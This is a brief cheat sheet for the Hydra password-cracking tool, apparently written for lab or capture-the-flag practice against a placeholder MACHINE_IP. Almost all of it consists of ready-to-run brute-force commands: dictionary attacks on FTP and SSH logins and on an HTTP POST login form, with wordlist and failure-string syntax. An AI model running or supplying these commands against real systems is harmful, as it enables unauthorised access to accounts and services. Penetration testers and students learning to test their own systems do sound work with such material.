# Hydra cheat sheet

## Install
sudo apt install hydra

## FTP
hydra -l user -P passlist.txt ftp://MACHINE_IP

## SSH
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh

## Web forms
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

